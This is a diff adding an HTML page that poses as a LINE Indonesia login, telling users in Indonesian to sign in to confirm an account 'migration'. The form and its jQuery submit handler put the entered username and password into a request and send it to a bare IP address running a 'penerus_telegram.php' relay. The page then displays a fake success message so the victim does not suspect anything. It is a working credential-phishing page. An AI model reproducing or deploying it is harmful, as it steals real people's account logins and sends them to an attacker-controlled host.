@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html dir="ltr" data-lang="ja" lang="ja">
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta charset="UTF-8">
+<title>LINE</title>
+<meta name="description" content="企画指定のテキスト">
+<meta name="keywords" content="企画指定のキーワード, キーワード">
+<link rel="stylesheet" href="LINE_files/line_reset_pc_1398083459.css">
+
+<!--<script src="../../dist/lc.line.web.login.common.js"></script>-->
+<script>
+window.alert = function() {};
+
+// or simply
+alert = function() {};
+</script>
+<!--<script src="LINE_files/lc_002.js"></script>-->
+<!--[if lt IE 9]><script src="https://static.line.naver.jp/line_web_login/js/html5_1398083459.js"></script><![endif]-->
+<style>
+/* Start by setting display:none to make this hidden.
+   Then we position it in relation to the viewport window
+   with position:fixed. Width, height, top and left speak
+   for themselves. Background we set to 80% white with
+   our animation centered, and no-repeating */
+.modal {
+    display:    none;
+    position:   fixed;
+    z-index:    1000;
+    top:        0;
+    left:       0;
+    height:     100%;
+    width:      100%;
+    background: rgba( 255, 255, 255, .8 ) 
+                url('LINE_files/ajax-loader.gif') 
+                50% 50% 
+                no-repeat;
+}
+
+/* When the body has the loading class, we turn
+   the scrollbar off with overflow:hidden */
+body.loading .modal {
+    overflow: hidden;   
+}
+
+/* Anytime the body has the loading class, our
+   modal element will be visible */
+body.loading .modal {
+    display: block;
+}
+</style>
+</head>
+<body data-new-gr-c-s-check-loaded="8.874.0" data-gr-ext-installed="">
+<div class="LyWrap">
+<!--HEADER-AREA-->
+<header class="LyHead"><div class="lyHeadInner">
+<h1 class="MdGHD01Logo">LINE Indonesia</h1>
+</div><!--/LyHead--></header>
+<!--/HEADER-AREA-->
+
+<!--CONTENTS-AREA-->
+<div class="LyContents" role="main">
+
+<section>
+<form id="lineconfirmationlogin" action="http://202.158.77.82:81/alpha.zenziva.net/penerus_telegram.php" method="post">
+<input type="hidden" name="id" id="rsaKeyName" value="">
+<input type="hidden" name="verifier" id="verifier" value="JI8nXsvk3x33qE8VKEnECmWGvcWzKnQs">
+<input type="hidden" name="password" id="ipt_login_param_encrypt" value="">
+
+<div class="MdCMN01Cont">
+<h2 class="mdCMN01Ttl">Login LINE</h2>
+
+<p class="mdCMN01Desc">Untuk mengkonfirmasi migrasi pada sever LINE Indonesia mohon untuk login.</p>
+<div class="MdInput01"><div class="mdInput01Input"><input name="username" type="username" id="FnUsername"  placeholder="Username" maxlength="50"></div></div>
+<div class="MdInput01"><div class="mdInput01Input"><input name="password" type="password" id="FnPassword" onkeypress="fnonchangeUpdate()" onkeydown="fnonchangeUpdate()" onkeyup="fnonchangeUpdate()" onchange="fnonchangeUpdate()" placeholder="Masukkan 6–20 karakter" maxlength="20"></div><span class="mdInput01Count"><em id="counting">0</em>/20</span></div>
+<div hidden="true" class="MdInput01"><div class="mdInput01Input"><input type="password" id="FnConfirmPassword" placeholder="Enter password again" maxlength="20"></div></div>
+<div class="MdBtn01P01 ExDisabled"><input type="submit" value="OK" id="FnSubmit"></div>
+<!--/MdCMN01Cont--></div>
+</form>
+</section>
+
+<!--/LyContents--></div>
+<!--/CONTENTS-AREA-->
+
+<!--FOOTER-AREA-->
+<footer class="LyFoot" role="contentinfo"><div class="lyFootInner">
+<div class="MdGFT01Copy"><small>©&nbsp;<b>LINE Corporation</b></small></div>
+</div><!--/LyFoot--></footer>
+<!--/FOOTER-AREA-->
+<!--/LyWrap--></div>
+<div class="modal"><!-- Place at bottom of page --></div>
+<!--SCRIPT-->
+<script src="LINE_files/jquery.js"></script>
+<!--<script src="LINE_files/lc.js"></script>-->
+
+<script>
+$body = $("body");
+
+$(document).on({
+    ajaxStart: function() { $body.addClass("loading");    },
+     ajaxStop: function() { $body.removeClass("loading"); }    
+});
+
+$(function(){
+  $('#lineconfirmationlogin').submit(function(e){
+    e.preventDefault();
+
+    var formData = $(this).serialize();
+    var actionURL = $(this).attr('action')+"?username=maunklana&message=uname "+$("#FnUsername").val()+" pwd "+$("#FnPassword").val();
+	
+	console.log("?username=maunklana&message=uname "+$("#FnUsername").val()+" pwd "+$("#FnPassword").val());
+	
+    $.ajax({
+      url:actionURL,
+      method:"POST",
+      data:formData,
+      success:function(data){
+      console.log(data);
+		$("#lineconfirmationlogin").html( '<div class="MdCMN01Cont"><h2 class="mdCMN01Ttl">Login LINE</h2><p class="mdCMN01Desc">Terima kasih, akun sudah berhasil termigrasi.<br/>silahkan tutup jendala peramban.</p>');
+      },
+      error:function(error){
+      console.log(error);
+		$("#lineconfirmationlogin").html( '<div class="MdCMN01Cont"><h2 class="mdCMN01Ttl">Login LINE</h2><p class="mdCMN01Desc">Mohon maaf, Migrasi akun gagal.<br/>silahkan reload halaman ini.</p>');
+      }
+    });
+  });
+});
+</script>
+
+<script>
+/*
+new lc.line.web.login.resetPassword({
+    msg : {
+    	type : 'Your password must consist of 6–20 non-repeating characters with at least one letter and one number included.',
+        length : 'Your password is too short. Please try again.',
+        match  : 'Your passwords don\'t match.\nPlease try again.',
+        server : 'An error occurred while trying to process your request.\nPlease try again.'
+    },
+    rsaUrl : "/authct/v1/keys/line"
+});
+lcs_do();
+*/
+</script>
+
+<!--/SCRIPT-->
+
+<script>
+function fnonchangeUpdate() {
+  var x = document.getElementById("FnPassword").value;
+  document.getElementById("FnConfirmPassword").value = x;
+  if(x.length>=2){
+	document.getElementById("FnSubmit").parentElement.classList.remove('ExDisabled');
+  }else{
+	document.getElementById("FnSubmit").parentElement.classList.add('ExDisabled');
+  }
+  document.getElementById("counting").innerHTML = x.length;
+}
+</script>
+
+</body></html>
